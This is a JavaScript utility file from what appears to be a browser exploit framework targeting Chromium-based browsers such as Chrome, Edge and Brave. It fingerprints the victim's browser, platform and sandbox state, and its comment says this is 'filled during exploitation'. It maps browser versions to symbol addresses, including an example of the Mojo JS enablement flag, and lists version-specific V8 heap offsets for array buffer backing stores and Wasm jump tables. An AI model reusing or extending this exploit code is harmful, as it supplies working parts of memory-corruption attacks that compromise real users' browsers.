// Utils related to fingerprinting, browser version & symbols
{
    // Browser & Platform fingerprinting
    // Filled during exploitation
    var FINGERPRINT = {
        "browser": {
            "name": undefined,          // Browser name ("Google Chrome", "Microsoft Edge", "Brave", "Opera"...)
            "browser_version": {        // Browser version
                "major": undefined,
                "minor": undefined,
                "build": undefined,
                "patch": undefined
            },
            "chromium_version": {       // Chromium version
                "major": undefined,
                "minor": undefined,
                "build": undefined,
                "patch": undefined
            }
        },
        "platform": {
            "arch": undefined,          // Architecture ("x86", "x64", "aarch64"...)
            "bitness": undefined,       // Bitness ("32" / "64")
            "os": undefined,            // OS ("Windows", "Linux", "Android"...)
            "os_version": undefined,    // String identifying the OS version
            "device": undefined         // String identifying the device
        },
        "process": {
            "sandboxed": undefined      // Indicate whether the browser sandbox is enabled
        }
    }


    // Map browsers to Chromium versions & symbols
    let versions_map = new Map();
    let symbols_map = new Map();

    let versionToStr = (version) => {
        if (typeof version === "object" && ["major", "minor", "build", "patch"].every(p => version.hasOwnProperty(p))) {
            version = `${version.major}.${version.minor}.${version.build}.${version.patch}`
        }
        return version
    }

    let hash_keys = (...args) => {
        return JSON.stringify(args);
    }

    function getBrowserToChromiumVersion(browser=undefined, version=undefined) {
        if (typeof browser === "undefined") browser = FINGERPRINT.browser.name;
        if (typeof version === "undefined") version = FINGERPRINT.browser.browser_version;
        return versions_map.get(hash_keys(browser, versionToStr(version)));
    }

    function setBrowserToChromiumVersion(browser, version, chromium) {
        versions_map.set(hash_keys(browser, versionToStr(version)), chromium);
    }

    function getSymbol(symbol_name, browser=undefined, os=undefined, arch=undefined, version=undefined) {
        if (typeof browser === "undefined") browser = FINGERPRINT.browser.name;
        if (typeof os === "undefined") os = FINGERPRINT.platform.os;
        if (typeof arch === "undefined") arch = FINGERPRINT.platform.arch;
        if (typeof version === "undefined") version = FINGERPRINT.browser.browser_version;
        return symbols_map.get(hash_keys(browser, os, arch, versionToStr(version), symbol_name));
    }

    function addSymbol(browser, os, arch, version, symbol_name, symbol_addr) {
        symbols_map.set(hash_keys(browser, os, arch, versionToStr(version), symbol_name), symbol_addr);
    }

    // Examples:
    // setBrowserToChromiumVersion("Brave", "133.1.75.181", "133.0.6943.141");
    // addSymbol("Brave", "Windows", "x64", "133.1.75.181", "is_mojo_js_enabled_", 0x100b0080n);
}


// Structures, offsets & constants across Chromium versions
// Base address input must be a strong tagged pointer
// Returned fields are untagged pointers
{
    class V8Struct {
        constructor(base=0x1n) {
            assert(isStrongTaggedPtr(base), `[-] Invalid pointer for ${this.constructor.name} (0x${hex(base)})`);
            this.base = untagPtr(BigInt(base));
        }
    }


    class JSArrayBuffer extends V8Struct {
        get byte_length() {
            if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x10n;
            return this.base + 0x14n;
        }

        get max_byte_length() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x14n;
                return this.base + 0x18n;
            }

            if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x18n;
            return this.base + 0x1cn;
        }

        get backing_store() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x18n;
                return this.base + 0x1cn;
            }

            if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x20n;
            return this.base + 0x24n;
        }
    }


    class WasmInstanceObject extends V8Struct {
        get trusted_data() {
            if (FINGERPRINT.browser.chromium_version.major <= 121) return undefined;
            return this.base + 0xcn;
        }

        // < M122 only
        get jump_table_start() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major <= 112) return this.base + 0x40n;
                if (FINGERPRINT.browser.chromium_version.major <= 119) return this.base + 0x3cn;
                if (FINGERPRINT.browser.chromium_version.major <= 121) return this.base + 0x38n;
                return undefined;
            }

            if (FINGERPRINT.browser.chromium_version.major <= 112) return this.base + 0x60n;
            if (FINGERPRINT.browser.chromium_version.major <= 113) return this.base + 0x58n;
            if (FINGERPRINT.browser.chromium_version.major <= 119) return this.base + 0x50n;
            if (FINGERPRINT.browser.chromium_version.major <= 121) return this.base + 0x48n;
            return undefined;
        }
    }


    // >= M122 only
    class WasmTrustedInstanceData extends V8Struct {
        get memory0_start() {
            if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x28n;
            return this.base + 0x18n;
        }

        get globals_start() {
            if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x40n;
            if (FINGERPRINT.browser.chromium_version.major <= 125) return this.base + 0x30n;
            return this.base + 0x28n;
        }

        get jump_table_start() {
            if (FINGERPRINT.platform.bitness === "32") {
                if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x30n;
                if (FINGERPRINT.browser.chromium_version.major <= 124) return this.base + 0x24n;
                if (FINGERPRINT.browser.chromium_version.major <= 127) return this.base + 0x20n;
                return this.base + 0x1cn;
            }

            if (FINGERPRINT.browser.chromium_version.major == 122) return this.base + 0x48n;
            if (FINGERPRINT.browser.chromium_version.major <= 127) return this.base + 0x38n;
            return this.base + 0x30n;
        }
    }


    var STRUCTS = {
        "JSArrayBuffer": JSArrayBuffer,
        "WasmInstanceObject": WasmInstanceObject,
        "WasmTrustedInstanceData": WasmTrustedInstanceData,
    };
}
